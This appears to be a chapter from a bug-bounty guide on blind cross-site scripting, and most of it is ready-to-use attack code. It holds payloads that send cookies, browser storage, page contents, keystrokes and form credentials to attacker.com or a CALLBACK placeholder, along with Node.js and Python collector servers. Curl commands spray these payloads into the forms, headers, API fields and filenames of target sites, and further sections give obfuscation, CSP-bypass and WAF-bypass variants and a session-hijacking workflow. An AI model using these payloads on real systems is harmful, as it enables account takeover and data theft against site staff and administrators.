# 08 - Blind XSS

## Overview

Blind XSS occurs when an attacker injects a payload that is stored by the application but executes in a context the attacker cannot directly observe -- a different page, a different user's session, or at a later time. Unlike standard stored XSS where the attacker can immediately verify execution with `alert()`, blind XSS payloads fire in admin panels, support dashboards, log viewers, or internal tools that the attacker never sees. Detection relies entirely on out-of-band (OOB) callback mechanisms.

Blind XSS is exceptionally high-impact because it typically fires in privileged contexts (admin sessions, support staff browsers), making session hijacking and privilege escalation the primary exploitation goals.

**References:**
- https://www.bugcrowd.com/blog/the-guide-to-blind-xss-advanced-techniques-for-bug-bounty-hunters-worth-250000/
- https://www.intigriti.com/researchers/blog/hacking-tools/hunting-for-blind-cross-site-scripting-xss-vulnerabilities-a-complete-guide
- https://secnora.com/blog/understanding-blind-xss/

---

## 1. What Makes XSS "Blind"

### 1.1 Defining Characteristics

- **Different rendering context:** Payload is submitted in a user-facing form but renders in an admin/internal interface
- **Different user:** Payload fires in the browser of a different user (support agent, admin, moderator) who views the injected data
- **Time delay:** Payload may not fire for hours, days, or weeks -- only when someone views the stored data
- **No direct feedback:** The attacker cannot see the page where the payload executes, making `alert()` useless for detection
- **Higher privilege context:** The victim is often an administrator or support agent with elevated permissions

### 1.2 Why Blind XSS Is More Dangerous

| Factor | Standard Stored XSS | Blind XSS |
|--------|---------------------|-----------|
| Victim | Any page visitor | Admin/staff with elevated privileges |
| Verification | Immediate (alert) | Requires OOB callback |
| Impact | User-level | Admin-level (session hijack, data access) |
| Detection difficulty | Moderate | High (invisible to attacker) |
| Common payout | $500-$2,000 | $2,000-$25,000+ |

**Reference:** https://undercodetesting.com/blind-xss-detection-and-exploitation-techniques/

---

## 2. High-Value Targets for Blind XSS

### 2.1 Admin Panels and Back-Office Tools

Admin dashboards that display user-submitted data are the primary blind XSS target:

- **User management panels:** Display registration data (usernames, emails, bios)
- **Content moderation queues:** Show reported content, flagged posts, pending reviews
- **Order/transaction management:** Display customer names, addresses, order notes
- **Analytics dashboards:** Render page titles, referrer URLs, search queries from visitors
- **Audit/activity logs:** Show user actions, IP addresses, user-agent strings

### 2.2 Support Ticket Systems

Support desks (Zendesk, Freshdesk, Jira Service Desk, custom systems) render ticket content submitted by external users in an internal agent interface:

- Ticket subject and body
- Customer name and email
- Attachment filenames
- Custom field values

**Real-world case:** A bug bounty researcher earned a bounty by injecting a blind XSS payload into a support ticket subject line. The payload fired when a support agent opened the ticket in the internal helpdesk interface, exfiltrating the agent's session token.

**Reference:** https://medium.com/@mejbankadir/blind-xss-how-i-found-it-75a990e06a9f

### 2.3 Log Viewers

Web-based log viewers that render log data as HTML:

- **Application logs:** User input values logged for debugging
- **Access logs:** URLs, User-Agent strings, Referer headers
- **Error logs:** Exception messages containing user input
- **Security/audit logs:** Failed login usernames, blocked requests

### 2.4 Error Reporting and Monitoring

Error tracking systems (Sentry, Rollbar, custom dashboards) that display error context:

- Exception messages containing user input
- Request parameters logged with errors
- Stack traces with user-controlled values
- Browser information (User-Agent) in error reports

### 2.5 Analytics and Reporting Dashboards

Internal analytics tools that display visitor data:

- Page titles and URLs visited
- Search queries
- Referrer URLs
- Campaign parameters (UTM tags)

---

## 3. Blind XSS Callback Payloads

Since the attacker cannot see the page where the payload fires, every blind XSS payload must include a callback mechanism that notifies the attacker's server.

### 3.1 HTTP Callback (Basic)

```html
<!-- Basic image callback - confirms execution -->
<img src="https://attacker.com/blind?fire=1">

<!-- Callback with cookie exfiltration -->
<img src=x onerror="new Image().src='https://attacker.com/collect?cookie='+encodeURIComponent(document.cookie)">

<!-- Callback with page URL context -->
<img src=x onerror="new Image().src='https://attacker.com/collect?url='+encodeURIComponent(location.href)+'&cookie='+encodeURIComponent(document.cookie)">
```

### 3.2 Full Data Exfiltration via Fetch

```html
<!-- Comprehensive data collection payload -->
<script>
(function(){
  var data = {
    url: location.href,
    cookie: document.cookie,
    localStorage: JSON.stringify(localStorage),
    sessionStorage: JSON.stringify(sessionStorage),
    dom: document.documentElement.outerHTML.substring(0, 5000),
    origin: location.origin,
    referrer: document.referrer,
    userAgent: navigator.userAgent,
    timestamp: new Date().toISOString()
  };
  fetch('https://attacker.com/collect', {
    method: 'POST',
    mode: 'no-cors',
    body: JSON.stringify(data)
  });
})();
</script>
```

### 3.3 DOM Screenshot Capture (html2canvas)

Capturing a visual screenshot of the page where the payload fires reveals the internal interface layout, data, and functionality:

```html
<!-- Load html2canvas dynamically and capture screenshot -->
<script>
(function(){
  var s = document.createElement('script');
  s.src = 'https://attacker.com/html2canvas.min.js';
  s.onload = function(){
    html2canvas(document.body).then(function(canvas){
      var img = canvas.toDataURL('image/png');
      fetch('https://attacker.com/screenshot', {
        method: 'POST',
        mode: 'no-cors',
        body: img
      });
    });
  };
  document.head.appendChild(s);
})();
</script>
```

This is exactly how XSS Hunter works -- it uses the HTML5 Canvas API to generate a full screenshot of the vulnerable page, allowing the attacker to view internal admin panels, support desks, and other internal web applications.

**Reference:** https://blog.lrvt.de/identifying-blind-xss-attack-vectors-with-xsshunter/

### 3.4 Keylogger Injection

```html
<!-- Inject keylogger that persists while the page is open -->
<script>
(function(){
  var keys = '';
  document.addEventListener('keypress', function(e){
    keys += e.key;
    if(keys.length > 20){
      new Image().src = 'https://attacker.com/keys?k=' + encodeURIComponent(keys) + '&url=' + encodeURIComponent(location.href);
      keys = '';
    }
  });
})();
</script>
```

### 3.5 Full Page Content Exfiltration

```html
<!-- Exfiltrate the entire page DOM in chunks -->
<script>
(function(){
  var chunks = [];
  var html = document.documentElement.outerHTML;
  var chunkSize = 2000;
  for(var i = 0; i < html.length; i += chunkSize){
    chunks.push(html.substring(i, i + chunkSize));
  }
  chunks.forEach(function(chunk, idx){
    fetch('https://attacker.com/dom', {
      method: 'POST',
      mode: 'no-cors',
      headers: {'Content-Type': 'application/x-www-form-urlencoded'},
      body: 'chunk=' + idx + '&data=' + encodeURIComponent(chunk) + '&url=' + encodeURIComponent(location.href)
    });
  });
})();
</script>
```

### 3.6 DNS-Based Callback (Firewall Bypass)

When HTTP callbacks are blocked by egress firewalls, DNS lookups often still work:

```html
<!-- DNS exfiltration of cookie via subdomain lookup -->
<script>
(function(){
  var encoded = btoa(document.cookie).replace(/[^a-zA-Z0-9]/g, '').substring(0, 60);
  new Image().src = 'https://' + encoded + '.attacker.com/x.png';
})();
</script>
```

### 3.7 Dynamic Script Import (Modern Approach)

The most effective modern approach uses JavaScript's `import()` function to load external scripts, which generates server-side logs that enable researchers to track when, where, and how their payloads execute:

```html
<!-- Using dynamic import() for clean external script loading -->
"><script src=https://attacker.com/probe.js></script>

<!-- Via event handler with external script load -->
<img src=x onerror="var s=document.createElement('script');s.src='https://attacker.com/probe.js';document.head.appendChild(s);">

<!-- ES module import (modern browsers) -->
"><img src=x onerror="import('https://attacker.com/probe.js')">
```

**Reference:** https://spyboy.blog/2025/02/07/complete-guide-to-exploiting-blind-xss-vulnerabilities/

---

## 4. Blind XSS Platforms and Infrastructure

### 4.1 XSS Hunter (Self-Hosted)

XSS Hunter (xsshunter-express) is the gold standard for blind XSS detection. It automatically captures:
- Full page screenshot (HTML5 Canvas)
- Complete DOM snapshot
- Cookies and HTTP headers
- Origin URL and referrer
- Victim's IP and User-Agent
- Payload correlation (which injection triggered)

**Setup via Docker:**
```bash
# Clone xsshunter-express
git clone https://github.com/mandatoryprogrammer/xsshunter-express.git
cd xsshunter-express

# Edit docker-compose.yaml with your settings:
# - HOSTNAME: your callback domain (e.g., xss.yourdomain.com)
# - Database credentials
# - Notification email settings

# Start the service
docker-compose up -d

# Admin password is printed to stdout on first run
# Access web panel at https://your-hostname.com/admin/
```

**XSS Hunter probe payload (auto-generated):**
```html
"><script src=https://xss.yourdomain.com/probe.js></script>
```

**References:**
- https://github.com/mandatoryprogrammer/xsshunter-express
- https://github.com/trufflesecurity/xsshunter
- https://www.yeswehack.com/learn-bug-bounty/blind-xss-setup-self-hosted-xss-hunter-pwnmachine

### 4.2 Custom Collector (Node.js)

```javascript
// server.js - Minimal blind XSS collector
const express = require('express');
const fs = require('fs');
const app = express();
app.use(express.json({limit: '10mb'}));
app.use(express.urlencoded({limit: '10mb', extended: true}));

// Serve probe script
app.get('/probe.js', (req, res) => {
  res.type('application/javascript');
  res.send(`
    (function(){
      var data = {
        url: location.href,
        cookie: document.cookie,
        dom: document.documentElement.outerHTML.substring(0, 10000),
        localStorage: JSON.stringify(localStorage),
        origin: location.origin,
        referrer: document.referrer,
        userAgent: navigator.userAgent,
        timestamp: new Date().toISOString()
      };
      fetch('${req.protocol}://${req.get('host')}/collect', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        mode: 'no-cors',
        body: JSON.stringify(data)
      });
    })();
  `);
});

// Collect callback data
app.post('/collect', (req, res) => {
  const entry = {
    time: new Date().toISOString(),
    ip: req.ip,
    data: req.body
  };
  console.log('[BLIND XSS FIRED]', JSON.stringify(entry, null, 2));
  fs.appendFileSync('callbacks.json', JSON.stringify(entry) + '\n');
  res.status(200).end();
});

// Screenshot collection endpoint
app.post('/screenshot', (req, res) => {
  const filename = `screenshot_${Date.now()}.png`;
  fs.writeFileSync(filename, req.body, 'base64');
  console.log('[SCREENSHOT]', filename);
  res.status(200).end();
});

app.listen(3000, () => console.log('Blind XSS collector on :3000'));
```

### 4.3 Custom Collector (Python/Flask)

```python
# collector.py - Python blind XSS collector
from flask import Flask, request, jsonify
from datetime import datetime
import json, os

app = Flask(__name__)
CALLBACK_LOG = 'blind_xss_callbacks.jsonl'

@app.route('/probe.js')
def probe():
    host = request.host_url.rstrip('/')
    script = f"""
    (function(){{
      var d = {{
        url: location.href,
        cookie: document.cookie,
        dom: document.documentElement.outerHTML.substring(0, 10000),
        localStorage: JSON.stringify(localStorage),
        origin: location.origin,
        referrer: document.referrer,
        userAgent: navigator.userAgent
      }};
      fetch('{host}/collect', {{
        method: 'POST',
        headers: {{'Content-Type': 'application/json'}},
        mode: 'no-cors',
        body: JSON.stringify(d)
      }});
    }})();
    """
    return script, 200, {'Content-Type': 'application/javascript'}

@app.route('/collect', methods=['POST'])
def collect():
    entry = {
        'timestamp': datetime.utcnow().isoformat(),
        'source_ip': request.remote_addr,
        'data': request.get_json(silent=True) or request.form.to_dict()
    }
    print(f"\n[BLIND XSS CALLBACK] {json.dumps(entry, indent=2)}")
    with open(CALLBACK_LOG, 'a') as f:
        f.write(json.dumps(entry) + '\n')
    return '', 200

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8443, ssl_context='adhoc')
```

### 4.4 Burp Collaborator

Burp Suite Professional includes Collaborator, which provides OOB callback detection for DNS, HTTP, and SMTP:

```html
<!-- Burp Collaborator callback payload -->
<img src=x onerror="new Image().src='http://BURP-COLLABORATOR-ID.burpcollaborator.net/?c='+document.cookie">

<!-- DNS-only callback (when HTTP egress is blocked) -->
<script>
var x = new XMLHttpRequest();
x.open('GET', 'http://'+document.cookie.replace(/[^a-z0-9]/gi,'')+'.BURP-COLLABORATOR-ID.burpcollaborator.net');
x.send();
</script>
```

### 4.5 Generic Webhook Services (Quick Testing)

For rapid testing without infrastructure setup:

```html
<!-- Using webhook.site -->
<img src=x onerror="fetch('https://webhook.site/YOUR-UUID?c='+document.cookie)">

<!-- Using Interactsh (ProjectDiscovery) -->
<img src=x onerror="new Image().src='http://YOUR-ID.interact.sh?c='+document.cookie">
```

---

## 5. Self-Hosted Blind XSS Infrastructure Setup

### 5.1 Complete Setup Checklist

```
1. Domain setup:
   - Register a dedicated domain (e.g., xsscallback.com)
   - Configure DNS A record pointing to your VPS
   - Wildcard DNS (*.xsscallback.com) for DNS exfiltration

2. TLS certificate:
   - Use Let's Encrypt for HTTPS (required for mixed-content policies)
   certbot certonly --standalone -d xsscallback.com -d *.xsscallback.com

3. Deploy collector:
   - XSS Hunter Express via Docker (recommended)
   - Or custom Node.js/Python collector (see above)

4. Notification setup:
   - Email alerts on callback (SMTP config in XSS Hunter)
   - Slack/Discord webhook for real-time alerts
   - Telegram bot notification

5. Payload generation:
   - Generate unique payloads per injection point for correlation
   - Include injection-point identifier in callback URL
```

### 5.2 XSS Hunter Express with Docker Compose

```yaml
# docker-compose.yaml
version: '3'
services:
  xsshunter:
    image: mandatoryprogrammer/xsshunter-express
    ports:
      - "443:443"
      - "80:80"
    environment:
      - HOSTNAME=xss.yourdomain.com
      - DATABASE_URL=postgresql://user:pass@db:5432/xsshunter
      - NOTIFICATION_EMAIL=you@email.com
      - SMTP_HOST=smtp.gmail.com
      - SMTP_PORT=465
      - SMTP_USER=your-email
      - SMTP_PASS=your-app-password
    depends_on:
      - db
  db:
    image: postgres:14
    environment:
      - POSTGRES_USER=user
      - POSTGRES_PASSWORD=pass
      - POSTGRES_DB=xsshunter
    volumes:
      - pgdata:/var/lib/postgresql/data

volumes:
  pgdata:
```

**Reference:** https://www.darknet.org.uk/2025/08/xsshunter-express-self-hosted-blind-xss-payload-capture-and-analysis/

---

## 6. Injection Points for Blind XSS

### 6.1 Contact Forms and Feedback

Any form that sends data to a human reviewer is a blind XSS vector:

```
Name field: "><script src=https://xss.yourdomain.com/probe.js></script>
Email field: xss@"><script src=https://xss.yourdomain.com/probe.js></script>.com
Message body: Please help with <script src=https://xss.yourdomain.com/probe.js></script>
Subject: Urgent: <img src=x onerror=import('https://xss.yourdomain.com/probe.js')>
```

### 6.2 HTTP Header Injection

HTTP headers logged or displayed in admin interfaces:

**User-Agent header:**
A researcher discovered blind XSS in a Vaccination Management portal where the admin dashboard displayed user User-Agent strings. Injecting a blind XSS payload in the User-Agent fired when an admin viewed the dashboard.

```bash
# Inject via User-Agent header
curl -A '"><script src=https://xss.yourdomain.com/probe.js></script>' https://target.com/contact

# Set Burp Suite match-and-replace rule:
# Match: User-Agent: .*
# Replace: User-Agent: "><script src=https://xss.yourdomain.com/probe.js></script>
```

**Reference:** https://www.bugbountyhunter.com/hackevents/report?id=726

**Referer header:**
The Referer header is logged by many analytics and admin tools. A researcher demonstrated blind/stored XSS via Referer header injection in a company portal contact form, where the backend reflected the Referer value into system-generated emails sent to internal support teams.

```bash
# Inject via Referer header
curl -H 'Referer: "><script src=https://xss.yourdomain.com/probe.js></script>' https://target.com/page
```

**Reference:** https://wadgamaraldeen.medium.com/blind-stored-xss-via-referer-header-injection-in-company-portal-contact-form-2553f20fd276

**Other injectable headers:**
```
X-Forwarded-For: <script src=https://xss.yourdomain.com/probe.js></script>
X-Forwarded-Host: "><img src=x onerror=import('//xss.yourdomain.com/probe.js')>
True-Client-IP: <svg/onload=import('//xss.yourdomain.com/probe.js')>
X-Custom-Header: <img src=x onerror=import('//xss.yourdomain.com/probe.js')>
```

**Pro tip from bug bounty hunters:** Set a Burp Suite match-and-replace rule to automatically inject blind XSS payloads into your User-Agent and Referer headers for every request during testing. This passively tests for blind XSS across the entire application.

### 6.3 Error Messages and Exception Handling

When user input triggers errors that are displayed in error dashboards (Sentry, Rollbar, custom tools):

```
# Submit malformed data that triggers server errors
# The error message may include the input value
Email: not-an-email<script src=https://xss.yourdomain.com/probe.js></script>
Number field: NaN<img src=x onerror=import('//xss.yourdomain.com/probe.js')>
JSON body: {"key": "<script src=https://xss.yourdomain.com/probe.js></script>"}
```

### 6.4 API Key Names and Resource Names

When APIs allow users to name resources (API keys, projects, teams, webhooks):

```bash
# Create API key with XSS name
curl -X POST https://target.com/api/keys \
  -H "Authorization: Bearer TOKEN" \
  -d '{"name": "<script src=https://xss.yourdomain.com/probe.js></script>"}'

# Create project/team with XSS name
curl -X POST https://target.com/api/projects \
  -d '{"name": "<img src=x onerror=import(\"//xss.yourdomain.com/probe.js\")>"}'
```

### 6.5 File Upload Names

```bash
# Upload file with XSS in filename (fires in admin file management)
curl -X POST https://target.com/upload \
  -F "file=@test.txt;filename=\"><script src=https://xss.yourdomain.com/probe.js></script>.txt"
```

### 6.6 Registration and Signup Forms

```
Username: <script src=https://xss.yourdomain.com/probe.js></script>
Company: "><img src=x onerror=import('//xss.yourdomain.com/probe.js')>
Address: <svg/onload=import('//xss.yourdomain.com/probe.js')>
Phone: "><script src=https://xss.yourdomain.com/probe.js></script>
```

### 6.7 Survey and Feedback Responses

```
# Open-ended survey answers viewed by analysts
Answer: <script src=https://xss.yourdomain.com/probe.js></script>
Rating comment: "><img src=x onerror=import('//xss.yourdomain.com/probe.js')>
```

---

## 7. Ready-to-Use Blind XSS Payloads

Replace `CALLBACK` with your XSS Hunter URL or custom collector domain.

### Basic Callback Payloads

```html
<!-- 1. Script src (most reliable) -->
"><script src=https://CALLBACK/probe.js></script>

<!-- 2. Image onerror with script load -->
"><img src=x onerror="var s=document.createElement('script');s.src='https://CALLBACK/probe.js';document.head.appendChild(s);">

<!-- 3. SVG onload -->
"><svg/onload="var s=document.createElement('script');s.src='https://CALLBACK/probe.js';document.head.appendChild(s);">

<!-- 4. Dynamic import (modern browsers) -->
"><img src=x onerror="import('https://CALLBACK/probe.js')">

<!-- 5. Fetch-based callback (no external script needed) -->
"><img src=x onerror="fetch('https://CALLBACK/c?u='+encodeURIComponent(location.href)+'&c='+encodeURIComponent(document.cookie))">
```

### Stealth Payloads (Minimal Footprint)

```html
<!-- 6. Invisible pixel callback -->
"><img src="https://CALLBACK/pixel.gif?c='+document.cookie" style="display:none">

<!-- 7. CSS-based callback (no JS needed, confirms rendering only) -->
"><style>@import url('https://CALLBACK/css?render=1');</style>

<!-- 8. Link prefetch (fires without JS execution) -->
"><link rel=prefetch href="https://CALLBACK/prefetch">
```

### Data Exfiltration Payloads

```html
<!-- 9. Cookie + URL + DOM exfiltration -->
"><script>fetch('https://CALLBACK/full',{method:'POST',mode:'no-cors',body:JSON.stringify({c:document.cookie,u:location.href,d:document.documentElement.innerHTML.substring(0,5000)})})</script>

<!-- 10. localStorage and sessionStorage dump -->
"><script>fetch('https://CALLBACK/storage',{method:'POST',mode:'no-cors',body:JSON.stringify({l:localStorage,s:sessionStorage,c:document.cookie})})</script>

<!-- 11. Session token from meta tags or JS variables -->
"><script>fetch('https://CALLBACK/tokens',{method:'POST',mode:'no-cors',body:JSON.stringify({meta:document.querySelector('meta[name=csrf-token]')?.content,cookie:document.cookie})})</script>
```

### Screenshot and Advanced Payloads

```html
<!-- 12. html2canvas screenshot capture -->
"><script>var s=document.createElement('script');s.src='https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js';s.onload=function(){html2canvas(document.body).then(function(c){fetch('https://CALLBACK/ss',{method:'POST',mode:'no-cors',body:c.toDataURL()})})};document.head.appendChild(s)</script>

<!-- 13. Keylogger injection -->
"><script>var k='';document.onkeypress=function(e){k+=e.key;if(k.length>15){fetch('https://CALLBACK/keys?k='+encodeURIComponent(k)+'&u='+encodeURIComponent(location.href),{mode:'no-cors'});k=''}}</script>

<!-- 14. Form credential harvesting (captures next form submit) -->
"><script>document.forms[0]&&(document.forms[0].onsubmit=function(){fetch('https://CALLBACK/form',{method:'POST',mode:'no-cors',body:new URLSearchParams(new FormData(this)).toString()})})</script>

<!-- 15. Recursive iframe exfiltration (access parent frames) -->
"><script>try{var f=window.top.document.documentElement.innerHTML;fetch('https://CALLBACK/parent',{method:'POST',mode:'no-cors',body:f.substring(0,10000)})}catch(e){fetch('https://CALLBACK/parent?err='+e.message,{mode:'no-cors'})}</script>
```

### Polyglot Blind XSS (Works in Multiple Contexts)

```html
<!-- 16. Works in HTML body, attribute, and JS string contexts -->
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('XSS') )//%0D%0A%0d%0a<svg/onload=import('//CALLBACK/probe.js')>

<!-- 17. Short polyglot for broad injection -->
'"><img src=x onerror=import('//CALLBACK/probe.js')>

<!-- 18. Header-safe payload (no quotes that break header values) -->
<script src=//CALLBACK/probe.js></script>
```

---

## 8. Automated Blind XSS Testing Workflow

### 8.1 Burp Suite Automation

```
1. Configure Burp Suite match-and-replace rules:
   - Replace User-Agent header value with blind XSS payload
   - Replace Referer header value with blind XSS payload
   - Append blind XSS payload to all parameter values

2. Set up Burp Intruder:
   - Payload positions: every input parameter
   - Payload list: blind XSS payloads with unique identifiers
   - Rate limit: respect target scope

3. Monitor XSS Hunter / collector for callbacks
```

### 8.2 Manual Spray Approach

```bash
# Inject blind XSS into every input field on every form
# Use unique identifiers per injection point for correlation

# Contact form
curl -X POST https://target.com/contact \
  -d "name=<script src=https://CALLBACK/probe.js?inj=contact_name></script>" \
  -d "email=test@test.com" \
  -d "message=<script src=https://CALLBACK/probe.js?inj=contact_msg></script>"

# Registration form
curl -X POST https://target.com/register \
  -d "username=<script src=https://CALLBACK/probe.js?inj=reg_user></script>" \
  -d "email=x@x.com&password=Test1234!"

# Profile update
curl -X PUT https://target.com/api/profile \
  -H "Authorization: Bearer TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"bio":"<script src=https://CALLBACK/probe.js?inj=profile_bio></script>"}'

# Headers (passive spraying during all requests)
curl -A '<script src=https://CALLBACK/probe.js?inj=useragent></script>' \
  -H 'Referer: <script src=https://CALLBACK/probe.js?inj=referer></script>' \
  https://target.com/any-page
```

### 8.3 Testing Decision Logic

```
1. Deploy blind XSS infrastructure (XSS Hunter Express or custom collector)
2. Generate unique payload per injection point:
   - Include injection identifier in callback URL (?inj=form_field_name)
   - This allows correlation when callback fires
3. Spray payloads into:
   a. All visible form fields (contact, registration, profile, search)
   b. HTTP headers (User-Agent, Referer, X-Forwarded-For)
   c. API string parameters (names, descriptions, labels)
   d. File upload names
   e. Error-triggering inputs
4. Wait 24-72 hours for callbacks (admin review cycles)
5. When callback fires:
   a. Identify injection point from callback URL parameter
   b. Analyze captured data (cookies, DOM, screenshot)
   c. Determine impact (admin session, internal data exposure)
   d. Attempt session hijacking with captured tokens
   e. Document full attack chain for report
6. If no callbacks after 72 hours:
   a. Try alternative payload formats (different encoding, event handlers)
   b. Consider time-based factors (business hours, review schedules)
   c. Expand injection surface (test more endpoints)
```

---

## 9. Evasion Techniques for Blind XSS

### 9.1 Payload Obfuscation

```html
<!-- Base64 encoded execution -->
<script>Function(atob('ZmV0Y2goJ2h0dHBzOi8vQ0FMTEJBQ0svYz9jPScrZG9jdW1lbnQuY29va2llKQ=='))()</script>

<!-- String concatenation -->
<script>window['fe'+'tch']('https://CALLBACK/c?c='+document.cookie)</script>

<!-- Template literals -->
<script>`${fetch(`https://CALLBACK/c?c=${document.cookie}`)}`</script>

<!-- Char code construction -->
<script>Function(String.fromCharCode(102,101,116,99,104,40,39,104,116,116,112,115,58,47,47,67,65,76,76,66,65,67,75,47,99,63,99,61,39,43,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101,41))()</script>
```

### 9.2 CSP Bypass Considerations

```html
<!-- If CSP blocks inline scripts, use event handlers -->
<img src=x onerror="location='https://CALLBACK/c?c='+document.cookie">

<!-- If CSP allows specific CDNs, abuse them for script loading -->
<!-- Example: AngularJS-based CSP bypass -->
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.3/angular.min.js"></script>
<div ng-app ng-csp>
  <div ng-click="$event.view.document.location='https://CALLBACK/c?c='+$event.view.document.cookie">click</div>
</div>

<!-- DNS prefetch (typically not restricted by CSP) -->
<link rel=dns-prefetch href="//cookie-value-here.CALLBACK">

<!-- meta redirect (if CSP does not restrict it) -->
<meta http-equiv="refresh" content="0;url=https://CALLBACK/c?c=cookie_here">
```

### 9.3 WAF Bypass for Blind XSS

```html
<!-- Encoding the script src -->
<script src=&#x68;&#x74;&#x74;&#x70;&#x73;&#x3a;&#x2f;&#x2f;CALLBACK/probe.js></script>

<!-- Using onpointerover instead of onerror (less commonly filtered) -->
<div onpointerover="import('//CALLBACK/probe.js')" style="position:fixed;top:0;left:0;width:100%;height:100%"></div>

<!-- Using onfocusin (fires without user interaction when element gains focus) -->
<input onfocusin="import('//CALLBACK/probe.js')" autofocus>

<!-- Using onanimationstart with CSS -->
<style>@keyframes x{from{opacity:1}to{opacity:1}}</style><div style="animation:x 1s" onanimationstart="import('//CALLBACK/probe.js')"></div>
```

**References:**
- https://www.yeswehack.com/learn-bug-bounty/xss-attacks-exploitation-ultimate-guide
- https://www.hackerone.com/blog/how-to-find-xss
- https://www.geeksforgeeks.org/understanding-blind-xss-for-bug-bounty-hunting/
- https://medium.com/@shadyfarouk1986/blind-xss-when-your-payloads-are-sneakier-than-your-ex-1321eec7af83
